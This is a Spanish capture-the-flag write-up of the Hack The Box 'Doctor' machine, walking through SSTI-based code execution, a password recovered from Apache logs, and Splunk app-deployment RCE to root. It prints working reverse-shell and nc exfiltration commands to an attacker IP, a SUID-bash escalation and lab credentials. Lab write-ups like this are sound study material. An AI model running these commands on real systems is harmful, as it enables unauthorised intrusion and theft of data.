---
layout: single
title: Doctor - Hack The Box
excerpt: "En este post estaremos resolviendo la maquina Doctor de la plataforma de HackTheBox que es categoría easy donde estaremos aprovechándonos de un SSTI para convertirlo a una ejecución remota de comandos y ganar acceso ala maquina como web ademas mediante un archivo donde se almacenan peticiones podremos ver que un usuario de la maquina cambio su contraseña y la podremos ver para migrar a ese usuario para la escalada nos aprovecharemos de Splunk para obtener una ejecución remota de comandos"
date: 2023-06-06
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-doctor/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Server Side Template Injection (SSTI)
  - Splunk Exploitation
  - Finding credentials in request logs
---

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.10.209
PING 10.10.10.209 (10.10.10.209) 56(84) bytes of data.
64 bytes from 10.10.10.209: icmp_seq=1 ttl=63 time=108 ms

--- 10.10.10.209 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.383/108.383/108.383/0.000 ms
❯ whichSystem.py 10.10.10.209

10.10.10.209 (ttl -> 63): Linux

```

## PortScan

```bash
❯ nmap -sCV -p22,80,8089 10.10.10.209 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 13:27 CST
Nmap scan report for 10.10.10.209
Host is up (0.11s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 594d4ec2d8cfda9da8c8d0fd99a84617 (RSA)
|   256 7ff3dcfb2dafcbff9934ace0f8001e47 (ECDSA)
|_  256 530e966b9ce9c1a170516c2dce7b43e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
|_http-server-header: Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/http Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
|_http-server-header: Splunkd
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
❯ nmap --script=http-enum -p80,8089 10.10.10.209 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 13:29 CST
Nmap scan report for 10.10.10.209
Host is up (0.11s latency).

PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
8089/tcp open  unknown
```

## Enumeracion 

Lo primero que vamos a hacer es enumerar el puerto 80 el puerto **8089** lo dejaremos para después 

```ruby
❯ whatweb http://10.10.10.209
http://10.10.10.209 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@doctors.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.209], JQuery[3.3.1], Script, Title[Doctor]
```

Y bueno tenemos una web donde básicamente podemos saber que se trata de algún consultorio o un pequeño hospital donde trabajan varios doctores y ofrecen sus servicios

![](/assets/images/htb-writeup-doctor/web1.png)

De primeras vemos que no se esta aplicando **Virtual Hosting** [mas información](https://es.wikipedia.org/wiki/Alojamiento_compartido)

```bash
❯ curl -s -I http://10.10.10.209
HTTP/1.1 200 OK
Date: Tue, 06 Jun 2023 20:04:58 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sat, 19 Sep 2020 16:59:55 GMT
ETag: "4d88-5afad8bea6589"
Accept-Ranges: bytes
Content-Length: 19848
Vary: Accept-Encoding
Content-Type: text/html
```

Bueno como vimos en el escaneo de **Nmap** cuando lanzamos el script **http-enum** que lo que hace es **fuzzear** en busca de rutas validas 

```bash
❯ wc -l /usr/share/nmap/scripts/http-enum.nse
515 /usr/share/nmap/scripts/http-enum.nse
```

Si descargamos una imagen del directorio **images** que nos reporto no vemos mucha información valiosa así que quiero pensar que por aquí no va la cosa

```bash
❯ wget http://10.10.10.209/images/img_1.jpg
--2023-06-06 14:07:45--  http://10.10.10.209/images/img_1.jpg
Conectando con 10.10.10.209:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 105630 (103K) [image/jpeg]
Grabando a: «img_1.jpg»

img_1.jpg                       100%[=======================================================>] 103.15K   333KB/s    en 0.3s    

2023-06-06 14:07:46 (333 KB/s) - «img_1.jpg» guardado [105630/105630]

❯ exiftool img_1.jpg
ExifTool Version Number         : 12.16
File Name                       : img_1.jpg
Directory                       : .
File Size                       : 103 KiB
File Modification Date/Time     : 2020:07:24 08:38:36-05:00
File Access Date/Time           : 2023:06:06 14:07:46-06:00
File Inode Change Date/Time     : 2023:06:06 14:07:46-06:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 80%
XMP Toolkit                     : Adobe XMP Core 5.6-c140 79.160451, 2017/05/06-01:08:21
Original Document ID            : 44A4A230096558D9D21B51CBD6481E70
Document ID                     : xmp.did:A5016F97C59C11EAB2EDBEE0A12C1E9E
Instance ID                     : xmp.iid:A5016F96C59C11EAB2EDBEE0A12C1E9E
Creator Tool                    : Capture One 7 Windows
Derived From Instance ID        : xmp.iid:0628D6663D50E31180B1F96F87DB1C96
Derived From Document ID        : 44A4A230096558D9D21B51CBD6481E70
Title                           : Happy specialist
Current IPTC Digest             : fce11f89c8b7c9782f346234075877eb
Coded Character Set             : UTF8
Application Record Version      : 2
IPTC Digest                     : fce11f89c8b7c9782f346234075877eb
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 800
Image Height                    : 533
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 800x533
Megapixels                      : 0.426
```

Vamos aplicar **fuzzing** con la herramienta `dirsearch` primeramente para ver si encontramos otras rutas que no nos reporto el **script** de **Nmap** 

```bash
❯ dirsearch -u http://10.10.10.209

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.10.209/_23-06-06_14-11-06.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-06_14-11-06.log

Target: http://10.10.10.209/

[14:11:06] Starting: 
[14:11:07] 301 -  309B  - /js  ->  http://10.10.10.209/js/
[14:11:12] 403 -  277B  - /.ht_wsr.txt
[14:11:12] 403 -  277B  - /.htaccess.bak1
[14:11:12] 403 -  277B  - /.htaccess.orig
[14:11:12] 403 -  277B  - /.htaccess.sample
[14:11:12] 403 -  277B  - /.htaccess.save
[14:11:12] 403 -  277B  - /.htaccess_extra
[14:11:12] 403 -  277B  - /.htaccess_orig
[14:11:12] 403 -  277B  - /.htaccess_sc
[14:11:12] 403 -  277B  - /.htaccessBAK
[14:11:12] 403 -  277B  - /.htaccessOLD
[14:11:12] 403 -  277B  - /.htaccessOLD2
[14:11:12] 403 -  277B  - /.htm
[14:11:12] 403 -  277B  - /.html
[14:11:12] 403 -  277B  - /.htpasswd_test
[14:11:12] 403 -  277B  - /.htpasswds
[14:11:12] 403 -  277B  - /.httr-oauth
[14:11:15] 403 -  277B  - /.php
[14:11:26] 200 -   19KB - /about.html
[14:11:50] 200 -   19KB - /contact.html
[14:11:51] 301 -  310B  - /css  ->  http://10.10.10.209/css/
[14:11:56] 301 -  312B  - /fonts  ->  http://10.10.10.209/fonts/
[14:11:59] 301 -  313B  - /images  ->  http://10.10.10.209/images/
[14:11:59] 200 -    3KB - /images/
[14:12:00] 200 -   19KB - /index.html
[14:12:01] 200 -    3KB - /js/
[14:12:23] 403 -  277B  - /server-status
[14:12:23] 403 -  277B  - /server-status/
```

Bueno como no encontramos nada interesante vamos a proceder a hacer **Fuzzing** pero ahora en busca de subdominios existentes ya que en la pagina web que corre en el puerto 80 encontramos un apartado que es un correo pero también puede ser una pista de la maquina 

```bash
❯ curl -s http://10.10.10.209/# | grep info
              <strong>info@doctors.htb</strong>
```

Bueno es curioso por que usando herramientas de **Fuzzing** como **Gobuster** y **wfuzz** no me encuentra subdominios si buscamos la palabra como tal `doctors` si se encuentra en este directorio pero no me lo muestra

```bash
❯ cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt | grep -n doctors
12069:doctors
30050:thedoctorshelper.com.inbound
62524:krdoctorstr
```

Pero al hacer **Fuzzing** simplemente no me reporto nada

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://10.10.10.209/" -H "Host: FUZZ.htb" --hw 1287
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.209/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================


Total time: 0
Processed Requests: 1364
Filtered Requests: 1364
Requests/sec.: 0

```

Si usara **Gobuster** aun asi no me lo muestra

```bash
❯ gobuster vhost -u http://10.10.10.209/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 80
```

Pero bueno lo que podemos hacer simplemente es agregarlo al `/etc/hosts` y ver si funciona o no 

```bash
❯ echo "10.10.10.209 doctors.htb" | sudo tee -a /etc/hosts
10.10.10.209 doctors.htb
❯ ping -c 1 doctors.htb
PING doctors.htb (10.10.10.209) 56(84) bytes of data.
64 bytes from doctors.htb (10.10.10.209): icmp_seq=1 ttl=63 time=225 ms

--- doctors.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 225.016/225.016/225.016/0.000 ms
```

Pues bueno al parecer funciona y ya vemos un panel de login

![](/assets/images/htb-writeup-doctor/web2.png)

Antes de enumerar esta parte podemos ver lo que se encuentra corriendo en el otro puerto que nos reporto **Nmap** 

## Splunk

Bueno vemos que en el puerto `8089` esta corriendo un servicio llamado **Splunk**

![](/assets/images/htb-writeup-doctor/web3.png)

Bueno quiero pensar que están usando este servicio para administrar y monitorizar todo lo relacionado a servicios de los doctores

![](/assets/images/htb-writeup-doctor/web4.png)

Bueno si le damos click en la parte de **services** nos llevara a un panel de login que podemos hacer fuerza bruta pero bueno no conocemos ni siquiera algún usuario valido asta ahora y perderíamos tiempo si buscamos si tiene la versión `8.0.5` tiene credenciales por defecto pues no nos servirán de nada

![](/assets/images/htb-writeup-doctor/web6.png)

Pues no nos funciona autenticaciones comunes como **admin:admin** pero bueno ahora que sabemos que el usuario **admin** existe podríamos aplicar **fuerza bruta** con un **script** de **Python3** pero bueno primero hay que enumerar la otra web 

![](/assets/images/htb-writeup-doctor/web7.png)

## Server Side Template Injection (SSTI)

Primeramente vamos a registrarnos ya que nos están dejando hacerlo y no tenemos credenciales de ningún usuario 

![](/assets/images/htb-writeup-doctor/web8.png)

Y bueno nuestra cuenta si se crea y nos dicen que solo podemos utilizarla por 20 minutos

![](/assets/images/htb-writeup-doctor/web9.png)

Vamos ahora a conectarnos y vemos esto 

![](/assets/images/htb-writeup-doctor/web10.png)

Bueno aquí vemos información de nuestra cuenta pero vemos un apartado mas interesante

![](/assets/images/htb-writeup-doctor/web11.png)

Y bueno nos deja escribir vamos a probar esto `<h1>Hola</h1>`

![](/assets/images/htb-writeup-doctor/web12.png)

Pero no lo interpreta 

![](/assets/images/htb-writeup-doctor/web14.png)

Como podemos ver nuestro `output` reflejado en la web podemos probar con un `SSTI`, **El Server-Side Template Injection**(**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.

Bueno también podemos tanto borrar como editar el `post`

![](/assets/images/htb-writeup-doctor/web15.png)

Vamos a editar el post y a probar con una multiplicación básica para ver si nos da el resultado podemos probar varios de esta web <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>

Pero no se refleja el `output` tampoco en el código fuente vamos a probar con otro

![](/assets/images/htb-writeup-doctor/web16.png)

Pues bueno de primeras no se interpreta este payload tampoco

![](/assets/images/htb-writeup-doctor/web17.png)

Pero si vemos el código fuente no se nos interpreta pero también ya nos podemos dar cuenta que hay un directorio existente que se llama **archive**

![](/assets/images/htb-writeup-doctor/web18.png)

De primeras no vemos nada pero si haces un `ctrl+u` para ver el código fuente vemos esto 

![](/assets/images/htb-writeup-doctor/web19.png)

Vamos a crear otro post donde ahora ingresaremos 

![](/assets/images/htb-writeup-doctor/xd.png)

Si recargamos en la parte de `archive` vemos que si funciona

![](/assets/images/htb-writeup-doctor/web20.png)

Y bueno vemos que es vulnerable también por los siguientes servicios que se están usando

![](/assets/images/htb-writeup-doctor/web21.png)

Si inyectamos este comando para ver si podemos tener ejecución remota de comandos vemos que si funciona también

![](/assets/images/htb-writeup-doctor/web22.png)

![](/assets/images/htb-writeup-doctor/web23.png)

## Shell as web 

Vamos a usar el siguiente payload para ganar acceso al sistema

![](/assets/images/htb-writeup-doctor/web24.png)

![](/assets/images/htb-writeup-doctor/hash.png)

Ahora nos pondremos en escucha

```bash
❯ nc -nlvp 443
listening on [any] 443 ...


```

Ahora crearemos el post inyectando todo ese payload en los 2 campos

Una vez creado simplemente recargamos la pagina otra vez en la ruta `/archive`

Y ganamos acceso

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.209] 58620
bash: cannot set terminal process group (876): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$ whoami
whoami
web
web@doctor:~$ id
id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
web@doctor:~$ 
```

Ahora haremos esto para poder hacer un `ctrl+c`

```bash
web@doctor:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
web@doctor:~$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
web@doctor:~$ export TERM=xterm
```

Bueno aquí vemos un `script` en `Bash` donde hay una **.db** 

```bash
web@doctor:~$ cat blog.sh 
#!/bin/bash
SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py
web@doctor:~$ cd blog/flaskblog/
web@doctor:~/blog/flaskblog$ ls
config.py  __init__.py  models.py  __pycache__  static     tmp
errors     main         posts      site.db      templates  users
web@doctor:~/blog/flaskblog$ file site.db 
site.db: SQLite 3.x database, last written using SQLite version 3031001
web@doctor:~/blog/flaskblog$ 
```

Vamos a transferir el archivo a nuestra maquina de atacante

```bash
web@doctor:~/blog/flaskblog$ cat < site.db > /dev/tcp/10.10.14.5/443
❯ nc -nlvp 443 > site.db
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.209] 58622
❯ ls
 site.db
❯ file site.db
site.db: SQLite 3.x database, last written using SQLite version 3032003
```

## Database 

De primeras nos podemos conectar y vemos un hash que al parecer es de admin pero no creo que nos sirva tal vez podamos reutilizar credenciales en caso de que sepamos la contraseña pero seguiremos enumerando

```bash
❯ sqlite3 site.db
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> select * from user;
1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
sqlite> 
```

## Shell as Shaun

Bueno vamos a subir el **linpeas.sh** ala maquina victima ya que después de enumerar no encontré nada interesante <https://github.com/carlospolop/PEASS-ng/releases>

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.10.209 - - [06/Jun/2023 16:50:47] "GET /linpeas.sh HTTP/1.1" 200 -
```

```bash
web@doctor:/dev/shm$ wget http://10.10.14.5:8080/linpeas.sh
--2023-06-07 00:50:45--  http://10.10.14.5:8080/linpeas.sh
Connecting to 10.10.14.5:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 836054 (816K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 816,46K  28,7KB/s    in 27s     

2023-06-07 00:51:13 (29,8 KB/s) - ‘linpeas.sh’ saved [836054/836054]

web@doctor:/dev/shm$ 
```

Después de darle permisos de ejecución y ejecutarlo vemos esto encontramos una contraseña que es `Guitar123`, al parecer un usuario realizo un cambio de contraseña y se guardo la petición en un archivo

```bash
╔══════════╣ Searching passwords inside logs (limit 70)
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
[    3.785472] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    5.666833] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
```

```bash
web@doctor:/var/log/apache2$ cat backup | grep reset
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
web@doctor:/var/log/apache2$ 

```

La contraseña es correcta

```bash
web@doctor:/var/log$ su shaun
Password: 
shaun@doctor:/var/log$ whoami
shaun
shaun@doctor:/var/log$ 

```

## User Flag

```bash
shaun@doctor:~$ cat user.txt 
b1757e0c88bd56df34768d982867415d
shaun@doctor:~$ 
```

## Shell as root

No tenemos ningún privilegio a nivel de sudoers

```bash
shaun@doctor:~$ sudo -l
[sudo] password for shaun: 
Sorry, user shaun may not run sudo on doctor.
shaun@doctor:~$ 
```

No vamos a aprovecharnos el `pkexec` para elevar nuestro privilegio

```bash
shaun@doctor:/$ find \-perm -4000 2>/dev/null | grep -v snap
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/umount
./usr/bin/sudo
./usr/bin/vmware-user-suid-wrapper
./usr/bin/newgrp
./usr/bin/fusermount
./usr/bin/su
./usr/bin/mount
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/pkexec
./usr/sbin/exim-4.90-6
./usr/sbin/mount.nfs
./usr/sbin/pppd
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/xorg/Xorg.wrap
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
shaun@doctor:/$ 
```

También después de probar no pude elevar mi privilegio mediante capabilites 

```bash
shaun@doctor:/$ getcap -r / 2>/dev/null
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/python3.8 = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
shaun@doctor:/$
```

Pero bueno algo que no recordé es que aun tenemos el **Splunk** que como tal no vimos ademas si recordarnos nos pedía credenciales para conectarnos al servicio podemos probar con las de shaun **shaun:Guitar123** 

Y funcionan una vez estamos dentro ya nos aparecen muchas mas cosas

![](/assets/images/htb-writeup-doctor/web25.png)

Bueno investigando como podemos aprovecharnos de **Splunk** podemos usar este repositorio y nos dan mas información <https://github.com/cnotin/SplunkWhisperer2>

```bash
❯ git clone https://github.com/cnotin/SplunkWhisperer2
Clonando en 'SplunkWhisperer2'...
remote: Enumerating objects: 77, done.
remote: Counting objects: 100% (23/23), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 77 (delta 10), reused 13 (delta 9), pack-reused 54
Recibiendo objetos: 100% (77/77), 25.45 KiB | 186.00 KiB/s, listo.
Resolviendo deltas: 100% (29/29), listo.
```

Y bueno tenemos el script para **RemoteCodeExecution**

```bash
❯ cd PySplunkWhisperer2
❯ ls
 build_exe.bat           PySplunkWhisperer2_local.py           PySplunkWhisperer2_remote.py   requirements.txt
 build_exe_python3.bat   PySplunkWhisperer2_local_python3.py   README.md         
```

Aqui te dejo el link donde la **IA** **ChatGPT** nos explica a detalle el script <https://chat.openai.com/share/cd3990bf-f349-437e-a780-fa316a86c6e3>

Esto es lo que nos pide el **script**

```bash
❯ python3 PySplunkWhisperer2_remote.py
usage: PySplunkWhisperer2_remote.py [-h] [--scheme SCHEME] --host HOST [--port PORT] --lhost LHOST [--lport LPORT]
                                    [--username USERNAME] [--password PASSWORD] [--payload PAYLOAD]
                                    [--payload-file PAYLOAD_FILE]
PySplunkWhisperer2_remote.py: error: the following arguments are required: --host, --lhost
```

Bueno como le podemos pasar el comando que queremos ejecutar lo que vamos a hacer primero es hacer un ping para ver si la recibimos

```bash
❯ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.5 --username shaun --password Guitar123 --payload "ping -c 1 10.10.14.5"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpvqucs7m5.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.5:8181/
10.10.10.209 - - [06/Jun/2023 17:43:31] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

```

Funciona 

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:43:36.957933 IP 10.10.10.209 > 10.10.14.5: ICMP echo request, id 2, seq 1, length 64
17:43:36.957961 IP 10.10.14.5 > 10.10.10.209: ICMP echo reply, id 2, seq 1, length 64

```

Bueno vamos a ver quien es el que esta ejecutando los comandos

```bash
❯ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.5 --username shaun --password Guitar123 --payload "whoami | nc 10.10.14.5 443"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpjl7pb6lx.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.5:8181/
10.10.10.209 - - [06/Jun/2023 17:45:16] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.209] 58652
root

```

Bueno lo que podemos hacer es Enviarnos una reverse shell como **Root** o poner la **Bash SUID** ya que estamos ejecutando comandos como root pero bueno como ya tenemos la `shell` como `shaun` pues podemos poner la **Bash** **SUID** asi que haremos eso 

```bash
❯ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.5 --username shaun --password Guitar123 --payload "chmod u+s /bin/bash"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpfw3kkh01.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.5:8181/
10.10.10.209 - - [06/Jun/2023 17:46:57] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

```

Y funciono 

```bash
shaun@doctor:/$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
shaun@doctor:/$ bash -p
bash-5.0# whoami
root
```

Pero bueno también  vamos a enviar una `reverse shell` para hacerlo de las 2 formas

```bash
❯ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.5 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpk4m9and8.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.5:8181/
10.10.10.209 - - [06/Jun/2023 17:49:03] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

```

Recibimos la Shell

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.209] 58658
bash: cannot set terminal process group (1142): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# whoami
whoami
root
```

## Root flag 

```bash
root@doctor:/root# cat root.txt 
905ffe397f2d70f847125b838b172e63
```



